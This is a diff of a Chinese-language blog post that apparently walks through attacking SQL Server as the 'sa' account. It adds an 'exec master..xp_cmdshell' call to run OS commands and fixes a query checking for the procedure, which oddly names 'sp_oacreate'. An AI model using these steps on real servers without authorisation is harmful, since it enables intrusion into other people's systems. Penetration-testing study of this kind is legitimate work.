@@ -35,9 +35,15 @@ SQL Server的默认超级管理员是`sa`，在早期版本中，SQL Server的�
 成功连上数据库，基本上就一半成功了，接下来尝试执行命令
 ![连接数据库](https://img.dreamfall.cn/post/sqlserver/2.webp)
 #### 尝试xp_cmdshell
+尝试直接执行命令
+```sql
+exec master..xp_cmdshell 'whoami'
+```
+失败，尝试启用`xp_cmdshel`
+
 1. 确认`xp_cmdshell`是否存在
    ```sql
-   elect count(*) from master.dbo.sysobjects where xtype='x' and name='sp_oacreate';
+   select count(*) from master.dbo.sysobjects where xtype='x' and name='sp_oacreate';
    ```
    ![xp_cmdshell](https://img.dreamfall.cn/post/sqlserver/3.webp)
 结果为1，则证明存在
